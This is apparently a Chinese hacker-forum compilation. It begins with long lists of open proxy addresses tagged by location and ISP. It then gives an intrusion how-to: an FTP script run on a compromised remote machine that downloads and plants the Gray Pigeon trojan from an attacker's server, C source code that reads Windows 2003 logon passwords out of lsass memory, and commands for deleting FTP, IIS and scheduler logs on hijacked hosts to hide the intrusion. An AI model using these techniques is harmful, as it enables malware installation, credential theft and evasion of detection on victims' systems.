61.138.130.229:8080 吉林省吉林市61.131.63.186:8080 福建省泉州市
218.57.113.11:8080 山东省青岛市网通ADSL 219.147.36.253:8080 山西省晋城市电信
218.12.171.14:8080 河北省廊坊市安次222.35.11.126:8080 北京市铁通 
61.53.181.164:8080 河南省平顶山市ADSL202.103.234.33:8080 广西南宁市电信
221.194.28.166:8080 河北省秦皇岛市网通168.160.229.2:8080 中国国家科委
211.167.135.29:8080 江苏省苏州市广电网210.75.35.10:8080 广东省金科信息网 
219.148.151.179:8080 河北省221.4.151.186:3128 广东省佛山市网通
211.92.108.205:8080 重庆市 


217.17.228.191:80
193.188.96.152:80
193.188.96.143:80
217.17.228.168:80
217.17.228.173:80
217.17.228.190:80
80.249.73.67:80
66.114.116.22:80
217.17.228.190:80
217.17.228.173:80
212.0.138.14:80
162.114.39.22:80
82.209.200.19:80
210.1.81.146:80
193.188.96.16:80
217.17.228.61:80
193.188.96.142:80
210.32.200.83:80
217.17.228.172:80
193.188.96.147:80
193.188.96.145:80
193.188.96.129:80
219.133.31.180:80
193.188.107.15:80
202.163.208.14:80
217.166.6.218:80
161.200.52.2:80
217.17.228.48:80
202.110.36.15:8080
203.199.194.71:80
212.154.104.10:8080
203.160.1.68:80
217.17.228.174:80
217.177.156.99:80
162.114.39.22:80
162.114.39.22:80
217.17.228.60:80
202.28.25.124:80
217.17.228.36:80
65.171.1.12:8080
217.17.233.185:80
217.17.228.182:80
193.188.107.7:80
193.188.96.138:80
193.188.96.145:80
12.9.159.5:8080
211.162.63.121:3128
193.188.107.15:80
222.43.34.94:80
219.144.196.202:8080
202.59.128.8:8080
203.169.250.29:80
193.188.96.157:80
218.76.51.3:8080
193.188.96.153:80
211.185.57.129:8080
193.188.96.158:80
218.76.51.3:8080
200.171.30.56:3128
195.55.164.2:80
170.145.102.22:80
200.215.36.17:80
193.188.96.63:80
193.188.96.17:80
213.139.47.84:8080
67.105.100.69:3128
202.110.36.15:8080
202.71.244.18:3128
195.235.180.7:3128
216.30.246.83:8080
195.145.214.67:8080
194.108.50.138:8080
63.150.90.196:8080
193.188.96.144:80
194.108.50.138:8080
219.240.37.28:80
80.191.129.70:80
166.63.215.146:80
193.188.107.7:80
65.241.12.142:80
193.188.96.190:80
82.67.10.175:80
193.171.32.4:80
200.215.50.9:80
61.221.93.67:3128
57.67.8.114:80
65.164.145.70:3128
200.168.37.149:6588
200.60.219.148:3128
61.221.242.188:3128
203.157.119.14:8080
193.188.96.137:80
216.236.200.99:80
69.26.222.234:80
210.17.170.14:3128
202.59.128.8:8080
218.28.135.196:8080
193.188.107.10:80
80.37.129.207:80
66.47.217.98:3128
217.17.228.162:80
193.188.96.137:80
59.120.112.141:80
200.162.244.20:3128
200.44.58.157:80
80.38.194.133:8080
217.66.3.82:80
195.229.240.86:80
220.225.84.16:80
83.146.17.76:80
218.44.163.210:3128
218.56.32.230:8080
216.180.119.73:8080
217.17.228.172:80
217.17.228.51:80
193.170.123.19:8080
208.45.201.18:80
220.225.84.21:80
203.115.71.10:80
202.92.84.142:80
65.165.84.11:80
210.192.124.162:80
61.19.158.50:8080
218.44.163.210:3128
210.179.45.226:8080
217.127.106.18:80
210.90.35.132:8080
80.38.3.248:80
217.17.228.174:80
218.24.4.9:80
82.129.167.19:3128
67.105.100.69:3128
218.22.44.243:8080
12.29.39.196:80
202.83.175.98:8080
80.32.151.115:80
219.93.25.93:8080
217.127.106.18:80
200.247.92.130:3128
82.129.167.171:3128
129.33.12.41:80
200.44.58.157:80
163.20.21.2:3128
193.170.123.19:8080
83.16.91.210:8080 

Http 代理174个
61.53.181.1一般:80@HTTP#河南省平顶山市 ADSL
61.53.181.1一般:8080@HTTP#河南省平顶山市 ADSL
61.131.63.62:8080@HTTP#福建省泉州市 (晋江/南安/惠安/泉港)电信
61.136.60.34:80@HTTP#天津市 网通
61.144.222.49:80@HTTP#广东省深圳市 ADSL
61.151.243.218:80@HTTP#上海市 电信
61.153.27.226:8080@HTTP#浙江省温州市 电信
61.161.72.211:80@HTTP#重庆市永川 松既镇职业中学
61.178.185.56:80@HTTP#甘肃省武威市 未知地址
61.186.158.186:80@HTTP#重庆市 未知地址
61.233.2.130:80@HTTP#北京市 铁通
61.233.144.194:3128@HTTP#山东省济南市 铁通
61.236.175.66:3128@HTTP#贵州省 未知地址
61.243.124.214:80@HTTP#[C]华南热带农业大学 (儋州总校区)
202.96.80.30:3128@HTTP#辽宁省盘锦市 未知地址
202.108.226.151:80@HTTP#北京市 网图网城安华店网吧
210.22.159.84:80@HTTP#上海市 网通
210.51.11.31:3128@HTTP#北京市 网通
210.73.73.108:80@HTTP#北京市 首都信息网
210.82.185.41:3128@HTTP#河北省任丘市 华北油田
211.94.172.216:80@HTTP#北京市 联通
211.98.24.6:8080@HTTP#北京市 铁通
211.138.91.21:8080@HTTP#内蒙古 力天投资置业有限公司
211.138.91.30:8080@HTTP#内蒙古呼和浩特市 移通
211.154.36.100:8080@HTTP#北京市 博升拓公司
211.162.63.121:3128@HTTP#广东省广州市 长城宽带
211.167.135.29:8080@HTTP#江苏省苏州市 广电网
218.12.38.82:8080@HTTP#河北省石家庄市 网通
218.22.44.244:8080@HTTP#安徽省合肥市 电信
218.22.176.142:80@HTTP#安徽省马鞍山市当涂县城关 谨鹏网吧
218.24.4.61:80@HTTP#辽宁省大连市 旅顺网通
218.25.120.54:3128@HTTP#辽宁省沈阳市 网通
218.28.16.21:3128@HTTP#河南省郑州市 未知地址
218.28.135.196:8080@HTTP#河南省郑州市 未知地址
218.56.32.2:1080@SOCKS4#山东省烟台市 网通
218.57.143.254:80@HTTP#山东省济南市 网通
218.76.51.3:8080@HTTP#湖南省长沙市 未知地址
218.94.9.45:3128@HTTP#江苏省南京市 电信
218.97.253.217:80@HTTP#北京市 未知地址
218.244.250.73:80@HTTP#北京市 未知地址
219.72.233.97:8080@HTTP#湖南省长沙市 未知地址
219.133.31.180:80@HTTP#广东省深圳市 鸿波机楼
219.149.76.198:8080@HTTP#辽宁省营口市 电信
219.149.233.179:8080@HTTP#吉林省长春市 电信
219.150.32.184:3128@HTTP#天津市 电信
219.227.4.1:8080@HTTP#广东省深圳市盐田区 田东小学
219.235.236.101:8080@HTTP#广东省深圳市 南凌科技
219.235.236.103:8080@HTTP#广东省深圳市 南凌科技
219.238.6.194:80@HTTP#北京市 电信ADSL
219.246.11.151:8080@HTTP#[C]兰州交通大学 未知地址
220.171.12.130:3128@HTTP#新疆乌鲁木齐市 (天山区)电信ADSL
220.194.209.116:1080@SOCKS4#河北省唐山市 联通
220.200.241.134:80@HTTP#广西 未知地址
220.200.241.190:80@HTTP#广西 未知地址
220.200.241.194:80@HTTP#广西 未知地址
220.200.241.213:80@HTTP#广西 未知地址
220.200.241.229:80@HTTP#广西 未知地址
220.200.241.237:80@HTTP#广西 未知地址
220.200.241.245:80@HTTP#广西 未知地址
220.200.241.253:80@HTTP#广西 未知地址
220.200.242.65:80@HTTP#广西 未知地址
220.200.242.150:80@HTTP#广西 未知地址
220.200.242.161:80@HTTP#广西 未知地址
220.200.242.193:80@HTTP#广西 未知地址
220.200.242.217:80@HTTP#广西 未知地址
220.200.242.232:80@HTTP#广西 未知地址
220.200.242.242:80@HTTP#广西 未知地址
220.200.242.249:80@HTTP#广西 未知地址
220.200.243.3:80@HTTP#广西 未知地址
220.200.243.74:80@HTTP#广西 未知地址
220.200.243.124:80@HTTP#广西 未知地址
220.200.243.126:80@HTTP#广西 未知地址
220.200.243.135:80@HTTP#广西 未知地址
220.200.243.169:80@HTTP#广西 未知地址
220.200.243.193:80@HTTP#广西 未知地址
220.200.243.225:80@HTTP#广西 未知地址
220.200.243.240:80@HTTP#广西 未知地址
220.200.244.49:80@HTTP#广西 未知地址
220.200.244.76:80@HTTP#广西 未知地址
220.200.244.143:80@HTTP#广西 未知地址
220.200.244.184:80@HTTP#广西 未知地址
220.200.244.207:80@HTTP#广西 未知地址
220.200.244.226:80@HTTP#广西 未知地址
220.200.244.235:80@HTTP#广西 未知地址
220.200.245.1:80@HTTP#广西 未知地址
220.200.245.23:80@HTTP#广西 未知地址
220.200.245.77:80@HTTP#广西 未知地址
220.200.245.135:80@HTTP#广西 未知地址
220.200.245.161:80@HTTP#广西 未知地址
220.200.245.198:80@HTTP#广西 未知地址
220.200.245.203:80@HTTP#广西 未知地址
220.200.245.236:80@HTTP#广西 未知地址
220.200.245.245:80@HTTP#广西 未知地址
220.200.246.9:80@HTTP#广西 未知地址
220.200.246.35:80@HTTP#广西 未知地址
220.200.246.38:80@HTTP#广西 未知地址
220.200.246.65:80@HTTP#广西 未知地址
220.200.246.69:80@HTTP#广西 未知地址
220.200.246.98:80@HTTP#广西 未知地址
220.200.246.127:80@HTTP#广西 未知地址
220.200.246.171:80@HTTP#广西 未知地址
220.200.246.186:80@HTTP#广西 未知地址
220.200.246.187:80@HTTP#广西 未知地址
220.200.246.231:80@HTTP#广西 未知地址
220.200.246.241:80@HTTP#广西 未知地址
220.200.246.243:80@HTTP#广西 未知地址
220.200.246.249:80@HTTP#广西 未知地址
220.200.247.9:80@HTTP#广西 未知地址
220.200.247.127:80@HTTP#广西 未知地址
220.200.247.129:80@HTTP#广西 未知地址
220.200.247.203:80@HTTP#广西 未知地址
220.200.247.214:80@HTTP#广西 未知地址
220.200.248.25:80@HTTP#广西 未知地址
220.200.248.43:80@HTTP#广西 未知地址
220.200.248.45:80@HTTP#广西 未知地址
220.200.248.140:80@HTTP#广西 未知地址
220.200.248.161:80@HTTP#广西 未知地址
220.200.248.189:80@HTTP#广西 未知地址
220.200.248.204:80@HTTP#广西 未知地址
220.200.248.222:80@HTTP#广西 未知地址
220.200.248.238:80@HTTP#广西 未知地址
220.200.248.245:80@HTTP#广西 未知地址
220.200.249.23:80@HTTP#广西 未知地址
220.200.249.97:80@HTTP#广西 未知地址
220.200.249.115:80@HTTP#广西 未知地址
220.200.249.152:80@HTTP#广西 未知地址
220.200.249.182:80@HTTP#广西 未知地址
220.200.249.193:80@HTTP#广西 未知地址
220.200.249.217:80@HTTP#广西 未知地址
220.200.249.252:80@HTTP#广西 未知地址
220.200.250.12:80@HTTP#广西 未知地址
220.200.250.25:80@HTTP#广西 未知地址
220.200.250.63:80@HTTP#广西 未知地址
220.200.250.97:80@HTTP#广西 未知地址
220.200.250.100:80@HTTP#广西 未知地址
220.200.250.146:80@HTTP#广西 未知地址
220.200.250.161:80@HTTP#广西 未知地址
220.200.250.165:80@HTTP#广西 未知地址
220.200.250.201:80@HTTP#广西 未知地址
220.200.251.15:80@HTTP#广西 未知地址
220.200.251.86:80@HTTP#广西 未知地址
220.200.251.109:80@HTTP#广西 未知地址
220.200.251.127:80@HTTP#广西 未知地址
220.200.251.131:80@HTTP#广西 未知地址
220.200.251.134:80@HTTP#广西 未知地址
220.200.251.141:80@HTTP#广西 未知地址
220.200.251.193:80@HTTP#广西 未知地址
220.200.251.223:80@HTTP#广西 未知地址
220.200.251.225:80@HTTP#广西 未知地址
220.200.252.106:80@HTTP#广西 未知地址
220.200.252.112:80@HTTP#广西 未知地址
220.200.252.113:80@HTTP#广西 未知地址
220.200.252.129:80@HTTP#广西 未知地址
220.200.252.219:80@HTTP#广西 未知地址
220.200.252.223:80@HTTP#广西 未知地址
220.200.252.243:80@HTTP#广西 未知地址
220.200.253.23:80@HTTP#广西 未知地址
220.200.253.49:80@HTTP#广西 未知地址
220.200.253.70:80@HTTP#广西 未知地址
220.200.253.77:80@HTTP#广西 未知地址
220.200.253.133:80@HTTP#广西 未知地址
220.200.253.135:80@HTTP#广西 未知地址
220.200.253.215:80@HTTP#广西 未知地址
220.200.253.231:80@HTTP#广西 未知地址
220.200.253.237:80@HTTP#广西 未知地址
220.200.254.17:80@HTTP#广西 未知地址
220.200.254.37:80@HTTP#广西 未知地址
220.200.254.92:80@HTTP#广西 未知地址
220.200.254.239:80@HTTP#广西 未知地址
220.202.150.210:80@HTTP#湖南省 未知地址
221.10.124.34:8080@HTTP#四川省宜宾市 网通
221.195.72.51:3128@HTTP#河北省河间市 未知地址
222.43.34.94:3128@HTTP#山东省济南市 铁通
222.43.34.94:80@HTTP#山东省济南市 铁通


【在DOS下修改注册表】
在DOS下修改注册表
atty.126.com  2003-12-30  网络休闲庄会员俱乐部


　
　　一、scanreg/restore
　　regedit.exe即可在Widnows下执行，也可以在DOS下执行，利用它可以把注册表或其中的一部分导出到一个文件中可以将你修改后的注册表文件导入到注册表中。

edit.exe是一个DOS下的编辑程序。可用它对你导出的注册表文件进行编辑。上网的朋友经常会遇到IE标题栏的内容被修改和注册表被锁住的情况，下面笔者以解开被锁的注册表为例一说具体的操作过程。


　　1、导出你想要修改的注册表分支


提示：在注册表中，决定是否允许修改注册表的值项的位置是：
HKEY_CURRENT_USER\Software\Microsoft\Windows\Current 

Version\Policies\Syetem 

I下面的DisableRegistryTools,如果它的值是“1”，则表示禁止修改注册表，“0”则表示允许修改注册表。有的网站就是用恶意代码将它的值改为“1”，从而禁止你用regedit.exe 来修改注册表。


命令格式：
regedit /e ls.reg 

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersin\

Policies\System

说明：/e这个参数的功能是导出注册表文件。
　　　ls.reg是导出的注册表文件名。
后面的KEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION
\POLICIES\SYSTEM是你要导出的注册表分支。锁住注册表不让你修改的值项就在这个主键的下面。

　　2、在DOS下面用edit.exe对ls.reg进行修改。
　　修改的方法很简单：运行edit，打开ls.reg，找到DisableRegistryTools，

然将其后的值改为0。
　　3、把修改好的注册表文件导入到注册表中。
命令格式：regedit ls.reg即在regedit后面加上你修改后的注册表文件。

三、自己编辑注册表文件
如果你掌握了第二种方法，那么你就可以自己编一个注册表文件，在DOS下用regedit.exe 命令导入到注册表中，来达到修改注册表的目的。与windows下编辑注册表文件不同的是，在DOS下编写注册表文件只能用edit.exe来完成。编写完成后，将文件存为扩展名为.reg的注册表文件，导入到注册表中即可。

　　注：在修改注册表之前记得备份。

四、regedit /参数 文件名

s /导入 .reg 文件进注册表（安静模式） 
/e 导出注册表文件 
例：regedit /e filename.reg HKEY_LOCAL_MACHINESYSTEM 
/L:system 指定 system.dat 
/R:user 指定 user.dat 
/C 压缩 [文件名] (Windows 98)




【在远程计算机的CMD内下载FTP文件】
在远程计算机的CMD环境下，如果不能通过IPC$渠道传送文件，那就只有通过FTP下载文件了。
假设我们已经有一个FTP服务器，上面有一个我们配置好的灰鸽子木马文件mhgz.exe,我们应该知道FTP服务器的三个参数：

1、FTP服务器的IP地址：如203.75.44.34
2、FTP服务器的用户名：如tty
3、FTP服务器的密 码：如tty123

在远程计算机的CMD下依次输入下面的命令：

1、echo open 203.75.44.34>>tty.txt 登陆FTP服务器
2、echo tty>>tty.txt 用户名
3、echo tty123>>tty.txt 密码
4、echo bin>>tty.txt 开始
5、echo get mhgz.exe>>tty.txt 下载灰鸽子木马
6、echo bye>>tty.txt 关闭FTP服务器

输入上面命令后，在远程计算机上就会生成一个tty.txt文件，内容为：
open 203.75.44.34
tty
tty123
bin
get mhgz.exe
bye

现在我们在远程计算机上执行下面的命令：
ftp -s:tty.txt 意思是，读取tty.txt里的参数，执行ftp命令，命令执行完后，灰鸽子木马文件mhgz.exe就下载到对方计算机里了。


del c:\tty.txt


【域控制器命令】
net user /domain

【如何使非管理员用户使用AT命令】
如何使非管理员用户使用AT命令？ 

通常情况下只有管理员才可以使用AT命令，有时也可能会希望服务器操作员也能够运行AT命令，那么就要修改注册表： 

1．启动注册表编辑器； 
2．找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa； 
3．在“编辑”菜单中选择“New Dword”； 
4．取名"SubmitControl"，按回车； 
5．双击名字后给字赋值1； 
6．退出注册表编辑器，重新启动计算机。 

在此过程完成后，您可以需要更新您的紧急修复盘。 


【如何在Windows 2003中得到登陆密码】
如何在Windows 2003中得到登陆密码

文章作者：WinEggDrop

在所有NT系统中，都是有几种方法可以得到登陆用户的密码的。我知道的三种方法可以达到目的。
　　1.hook了winlogon中几个函数，网上也有这类型的程序，叫winlogonhijack的项目在rootkit.com中有提供，不过那个项目只对本地登陆用户有效，远程登陆用户无效。
　　2.使用Gina和winlogon进行套接，只要对某些函数执行自己的记录密码的代码，就可以将密码记录下来，稳定性高，而且对本地或远程登陆都有效，不过现存的gina后门程序在XP或2003中都有些函数没有被导出过，主要因为xp和2003等在winlogon中加入了新的函数。
　　3.直接读取内存数据得到明文密码。在NT
4.0/2K中，早就有程序findpass可以直接读到winlogon进程中的内存数据而直接得到登陆用户密码，因为在NT4.0和2K中，帐号的信息，包括域名，帐号和密码都是有规律地在winlogon内存中的特定地址中，所以可以很简单就得到。但在XP和2003系统中，这样方法是无效的了，似乎我们是没有办法直接读出明文地址了。下面我们就来谈谈如何象findpass在NT
4.0和2K在，在server 2003中得到登陆用户的密码。
　　虽然XP和2003是不象以前的NT系统那样将登陆用户信息保存在winlogon进程的内存地址内，但是基Lsass进程对于要处理些信息时，需要得到明文的登陆用户密码，所以登陆用户的密码会在Lsass进程中出现(微软没有将密码在Lsass进程中进行加密，微软的说法是因为Lsass 需要得到明文的密码，就算将密码加密，也都只能用可逆的方法加密，只要跟踪lsass的操作，一样可以得到明文密码，所以微软使用了比较懒惰的方法，可能也是为了加快响应速度，所以将明文密码更是放在lsass进程内存内)。说到这里，大家心里都清楚了，登陆用户的密码是在lsass进程的内存中。对，就是这么一回事，但是要得到这个明文密码，真是象使用NT
4.0和2K下的findpass那样容易吗?事实上并不是那么容易，因为以下几个原因:
　　A.密码存放在lsass进程中的内存地址是没有规律的
　　B.密码有可能被最后登陆的用户复盖(例如管理员abc从本地登陆，然后管理员bbb从远程登陆，然后管理员bbb注销终端，存放在 lsass.exe进程内存中的密码，还是管理员bbb的密码)，又或者用户登陆后，然后注销了，那么我们就算得到了密码，也不知道是哪个用户的密码。
　　C.密码前后的数据也是没有规律的，如果有规律，例如密码前的数据，一定是有一段全是01字符的数据段，那么定位密码就简单。
　　原因A和C都给我们带来定位密码的困难，原B就带来不能确定密码和帐号对应的问题.看来微软在新的系统还是做过点功夫。不过我们是不会放弃的，就算是碰碰运气，也看能不能得到密码，反正就算失败，也没什么关系。
　　最后的代码，是我写来测试是不是能在2003的系统中得到登际用户的密码，结果也正好象我们上面的分析一样(当然了，上面的结果是用这程序测测得到的)。成功率当然不高，因为受太多原因所影响，定位密码上的困难或者无法定位，或者得到不是密码的信息等等的原因，都令失败率显得相当高，不过总还是一种方法，或者将来有人可以准确定位到，那就是令人高兴了。虽然说失败率高，但在一种情况下，成功率却是很高的，那就是管理员只是在本地或终端中登陆了，以后再没有用户从本地或终端登陆过，而且管理员也没有锁上过系统，那么成功率就会是相当高的了。
　　提高成功率的两种做法:
　　1.程序直接写成服务，定时检查本地或远程登陆(其实没什么分别)，当检测到登陆后，去搜索lsass进程内存，尝试得到密码。
　　2.程序模拟一个登陆(使用LogonUser()就能搞定)，因为使用LogonUser()这个API，你要提供帐号名和对应的正确的密码，才可以成功，然后你就可以去搜索lsass进程内存。因为知道密码是什么，我们就能定位到密码是保存在什么地方。因为登陆用户的密码都是保存在同一个地址或相离不远的地址中，模拟登陆和搜索，可以先定位以后登陆的用户的密码会大约保存在什么位置。
　　无论怎说，三种方法中，最稳定，最安全的方法还是使用Gina那种方法.Hijack了winlogn一些API的方法，毕竟是改动了系统的东西，对系统的稳定性来说，会有考验，直接搜索lsass进程内存的方法呢，虽说也是困难，但准确性，成功率却又是低。

下面的代码使用的是很笨，而且很原始的搜索方法，主要是搜索Lsass内存中"LocalSystem Remote
Procedure"这个字符串，因为在相当多的测试中，密码都是保存在有这个字符串的地址后一点的位置中，当然了，很多系统并没有这个字符串，或者就算有，我们得到的都是错误的密码。
　 代码:
//********************************************************************************
// Version: V1.0
// Coder: WinEggDrop
// Date Release: 12/15/2004
// Purpose: To Demonstrate Searching Logon User Password On 2003 Box，The
Method
// Used Is Pretty Unwise，But This May Be The Only Way To Review The
// Logon User's Password On Windows 2003.
// Test PlatForm: Windows 2003
// Compiled On: VC++ 6.0
//********************************************************************************
#include
#include
#include
#define BaseAddress 0x002b5000 // The Base Memory Address To Search;The
Password May Be Located Before The Address Or Far More From This Address，Which
Causes The Result Unreliable
char Password[MAX_PATH] = ; // Store The Found Password
// Function ProtoType Declaration
//------------------------------------------------------------------------------------------------------
BOOL FindPassword(DWORD PID);
int Search(char *Buffer，const UINT nSize);
DWORD GetLsassPID();
BOOL Is2003();
//------------------------------------------------------------------------------------------------------
// End Of Fucntion ProtoType Declaration
int main()
{
DWORD PID = 0;
printf("Windows 2003 Password Viewer
V1.0 By WinEggDrop\n\n");
if (!Is2003()) // Check Out If The Box Is 2003
{
printf("The Program
Can't Only Run On Windows 2003 Platform\n");
return -1;
}
PID = GetLsassPID(); // Get The Lsass.exe PID
if (PID == 0) // Fail To Get PID If Returning Zerom
{
return -1;
}
FindPassword(PID); // Find The Password From Lsass.exe Memory
return 0;
}
// End main()
//------------------------------------------------------------------------------------
// Purpose: Search The Memory & Try To Get The Password
// Return
Type: int
// Parameters:
// In: char *Buffer --> The Memory Buffer To
Search
// Out: const UINT nSize --> The Size Of The Memory Buffer
//
Note: The Program Tries To Locate The Magic String "LocalSystem Remote
Procedure"，
// Since The Password Is Near The Above Location，But It's Not
Always True That
// We Will Find The Magic String，Or Even We Find It，The
Password May Be Located
// At Some Other Place.We Only Look For Luck
//------------------------------------------------------------------------------------
int Search(char *Buffer，const UINT nSize)
{
UINT OffSet = 0;
UINT i = 0;
UINT j = 0 ;
UINT Count = 0;
if (Buffer == NULL)
{
return -1;
}
for (i = 0 ; i　0)
{
Password[Count++] =
Buffer[j];
}
else
{
break;
}
}
return i + 7; // One
Flag To Indicate We Find The Password
}
}
}
return -1; //
Well，We Fail To Find The Password，And This Always Happens
}
// End
Search
//------------------------------------------------------------------------------------
// Purpose: To Get The Lsass.exe PID
// Return Type: DWORD
//
Parameters: None
//------------------------------------------------------------------------------------
DWORD GetLsassPID()
{
HANDLE hProcessSnap;
HANDLE hProcess =
NULL;
PROCESSENTRY32 pe32;
DWORD PID = 0;
hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS， 0);
if(
hProcessSnap == INVALID_HANDLE_VALUE )
{
printf("Fail To Create Snap
Shot\n");
return 0;
}
pe32.dwSize = sizeof(PROCESSENTRY32);
if( !Process32First(hProcessSnap， &pe32))
{
CloseHandle(hProcessSnap); // Must clean up the snapshot object!
return
0;
}
do
{
if (strcmpi(pe32.szExeFile，"Lsass.EXE") == 0)
{
PID =
pe32.th32ProcessID;
break;
}
}while(Process32Next( hProcessSnap，
&pe32));
CloseHandle( hProcessSnap);
return PID;
}
// End GetLsassPID()
//------------------------------------------------------------------------------------
// Purpose: To Find The Password
// Return Type: BOOLEAN
//
Parameters:
// In: DWORD PID -> The Lsass.exe's PID
//------------------------------------------------------------------------------------
BOOL FindPassword(DWORD PID)
{
HANDLE hProcess = NULL;
char
Buffer[5 * 1024] = ;
DWORD ByteGet = 0;
int Found = -1;
hProcess = OpenProcess(PROCESS_VM_READ，FALSE，PID); // Open Process
if
(hProcess == NULL)
{
printf("Fail To Open Process\n");
return FALSE;
}
if (!ReadProcessMemory(hProcess，(PVOID)BaseAddress，Buffer，5 *
1024，&ByteGet)) // Read The Memory From Lsass.exe
{
printf("Fail To
Read Memory\n");
CloseHandle(hProcess);
return FALSE;
}
CloseHandle(hProcess);
Found = Search(Buffer，ByteGet); // Search The Password
if (Found >= 0)
// We May Find The Password
{
if (strlen(Password) > 0) // Yes，We
Find The Password Even We Don't Know If The Password Is Correct Or Not
{
printf("Found Password At #0x%x -> \"%s\"\n"，Found +
BaseAddress，Password);
}
}
else
{
printf("Fail To Find The
Password\n");
}
return TRUE;
}
// End FindPassword
//------------------------------------------------------------------------------------
// Purpose: Check If The Box Is Windows 2003
// Return Type: BOOLEAN
// Parameters: None
//------------------------------------------------------------------------------------
BOOL Is2003()
{
OSVERSIONINFOEX osvi;
BOOL b0sVersionInfoEx;
ZeroMemory(&osvi，sizeof(OSVERSIONINFOEX));
osvi.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
if (!(b0sVersionInfoEx=GetVersionEx((OSVERSIONINFO *)&osvi)))
{
osvi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
}
return
(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2);
}
// End
Is2003()
// End Of File 

　　附件程序相当于密码定位程序，用来测试在lsass内存中搜索指定的字符串或模拟登陆的密码.
　　用法:
　　1.locator 字符串 -> 在lsass进程内存中搜索指定的那个"字符串"，返回确定的位置
　　2.Locator 用户名 密码 ->
在系统中建立一个参数指定的用户，并进行模拟登陆，然后搜索"密码"在lsass进程内存中的位置，生成的帐户程序运行完后会自动删除

【如何在肉鸡上清除日志】
Windows2000的日志文件通常有应用程序日志，安全日志、系统日志、smtp服务器日志,DNS服务器日志、FTP日志、WWW日志等等，可能会根据服务器所开启的服务不同而有所不同。还有一些网络管理软件的日志，说到这里，记得新浪的网管软件是自己开发的，如果不了解这个，可能会留下更多的记录。 
这次只谈清除FTP。IIS应用程序日志，smtp服务器日志,系统日志这些一般日志的命令行下的删除方法. 
(1) Scheduler日志 

Scheduler服务日志默认位置：2000下: %sys temroot%\schedlgu.txt NTworkstation下为 SchedLog.txt 
可以打开schedlgu.txt 
Schedluler服务日志在注册表中 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent 
先停掉他 net stop "task scheduler" (注意不停是删不掉的) 
然后再 del schedlgu.txt 或 schedlog.txt之后就OK了. 
del sched*.txt 
不过你如果不想删他,也可以改改它. 他的内容是这样的: 
" "任务计划程序服务" 
已退出于 01-5-22 20:37:34 
"任务计划程序服务" 
已启动于 01-5-25 7:07:37 
"任务计划程序服务" 
已启动于 01-5-25 7:26:36 
"任务计划程序服务" 
已退出于 01-5-25 8:47:54 " 
很好改的. 

(2) FTP日志 

Internet信息服务FTP日志默认位置：%sys temroot%\sys tem32\logfiles\msftpsvc1\，默认每天一个日志. 
格式是这样的 ex*.log . 
注意这是一台NT4的LOGFILES下的文件: 
这台服务器下管理有多个HTTP或FTP站点 

c:\winnt\sys tem32\logfiles 的目录 

00-12-04 06:28p . 
00-12-04 06:28p .. 
01-05-18 12:56p MSFTPSVC1 
01-04-23 11:28a MSFTPSVC2 
01-01-12 11:56a MSFTPSVC3 
01-06-01 08:12a SMTPSVC1 
01-09-20 08:55a W3SVC1 
01-08-02 10:36a W3SVC10 
01-10-11 04:48p W3SVC11 
01-07-11 09:16a W3SVC2 
01-10-11 10:31a W3SVC3 
01-10-10 04:55p W3SVC4 
01-09-28 01:43p W3SVC5 
01-10-11 08:44a W3SVC6 
01-10-11 08:00a W3SVC7 
01-09-30 01:49p W3SVC8 
01-10-11 08:03a W3SVC9 

看看日志文件的格式: 
c:\winnt\sys tem32\logfiles\msftpsvc1\in010306.log 
192.168.5.8, anonymous, 01-3-6, 16:41:51, MSFTPSVC1, APPSERVER, 192.168.5.8, 0, 
0, 0, 331, 0, [3]USER, anonymous, -, 
192.168.5.8, -, 01-3-6, 16:41:51, MSFTPSVC1, APPSERVER, 192.168.5.8, 0, 0, 0, 53 
0, 1326, [3]PASS, IE30User@, -, 
关于LOG文件的含意我就不解释了,浪费时间,嘿嘿. 

法一:> 这个时侯 net stop msftpsvc 停掉后台服务. 
然后尽管 del ............ 
看这删吧,不要删的过火,把当天的删了就行. 别忘了再NET START MSFTPSVC 把服务打开. 
法二:> 当然你如果还想更好,那就改改日志,可以改了系统时间后再改日志,只把你的清了,别忘了把时间改回来哦 
实际上在得到ADMIN权限后,做这些事很容易. 

法三:) 最傻瓜的清FTP日志的方法, cleaniislog 小蓉写的工具,不用我再教了吧! 


(3) WWW日志 

Internet信息服务WWW日志默认位置：%sys temroot%\sys tem32\logfiles\w3svc1\，默认每天一个日志 

注意这是一台NT4的LOGFILES下的文件: 
这台服务器下管理有多个HTTP或FTP站点 

c:\winnt\sys tem32\logfiles 的目录 

00-12-04 06:28p . 
00-12-04 06:28p .. 
01-05-18 12:56p MSFTPSVC1 
01-04-23 11:28a MSFTPSVC2 
01-01-12 11:56a MSFTPSVC3 
01-06-01 08:12a SMTPSVC1 
01-09-20 08:55a W3SVC1 
01-08-02 10:36a W3SVC10 
01-10-11 04:48p W3SVC11 
01-07-11 09:16a W3SVC2 
01-10-11 10:31a W3SVC3 
01-10-10 04:55p W3SVC4 
01-09-28 01:43p W3SVC5 
01-10-11 08:44a W3SVC6 
01-10-11 08:00a W3SVC7 
01-09-30 01:49p W3SVC8 
01-10-11 08:03a W3SVC9 

w3svc1 下的文件: 
01-09-18 08:00a 70,918 ex010917.log 
01-09-19 08:00a 3,243,955 ex010918.log 
01-09-19 10:25p 2,686,976 ex010919.log 
01-09-20 10:00a 327,680 ex010920.log 

此时看看文件内容: type c:\winnt\sys tem32\logfiles\w3svc1\ex010920.log 

01:26:17 127.74.36.149 GET /c/winnt/sys tem32/cmd.exe 404 
01:26:17 127.37.88.60 GET /_vti_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd.e 
xe 404 
01:26:17 127.208.246.13 GET /d/winnt/sys tem32/cmd.exe 404 
01:26:17 127.74.36.149 GET /d/winnt/sys tem32/cmd.exe 404 
01:26:17 127.37.88.60 GET /_mem_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd.e 
xe 404 
01:26:17 127.208.246.13 GET /scripts/..%5c../winnt/sys tem32/cmd.exe 403 
01:26:17 127.74.36.149 GET /scripts/..%5c../winnt/sys tem32/cmd.exe 403 
